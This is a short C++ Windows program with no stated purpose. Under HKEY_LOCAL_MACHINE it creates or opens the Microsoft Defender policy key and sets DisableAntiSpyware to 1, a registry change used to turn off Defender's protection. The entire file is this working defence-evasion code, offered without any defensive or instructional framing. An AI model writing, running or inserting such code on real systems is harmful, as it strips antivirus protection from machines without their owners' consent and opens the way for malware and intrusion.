#include "core/corelib.hpp"
#pragma comment(lib, "advapi32")

#define result_error(x, r) printf("error: %s -> 0x%lx\n", x, r); FormatResultError(r); goto defer

auto hKey = HKEY_LOCAL_MACHINE;
auto Subkey = R"(SOFTWARE\Policies\Microsoft\Microsoft Defender)";
auto valueName = "DisableAntiSpyware";

void FormatResultError(LRESULT Result) {

    LPSTR Buffer = { };

    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, nullptr, Result, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&Buffer, 0, nullptr);
    printf("%s", Buffer);
    LocalFree(Buffer);
}

int main() {

    LSTATUS Result  = 0;
    HKEY hkResult   = { };
    DWORD Value    = 0x1;

    printf("checking HKEY_LOCAL_MACHINE\n");

    if ((RegOpenKeyExA(hKey, Subkey, 0, KEY_READ, &hkResult)) != ERROR_SUCCESS) {
        printf("subkey does not exist. creating...\n");

        if ((Result = RegCreateKeyExA(hKey, Subkey, 0, nullptr, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_SET_VALUE, nullptr, &hkResult, nullptr)) != ERROR_SUCCESS) {
            result_error("could not create registry key", Result);
        }
    }

    printf("hKey: 0x%p: setting DWORD value for subkey\n", &hkResult);

    if ((Result = RegSetValueExA(hkResult, valueName, 0, REG_DWORD, (CONST PBYTE)&Value, sizeof(DWORD))) != ERROR_SUCCESS) {
        result_error("could not set key value for DisableAntiSpyware", Result);
    }

    printf("success\n");
    RegCloseKey(hkResult);

    defer:
    return Result;
}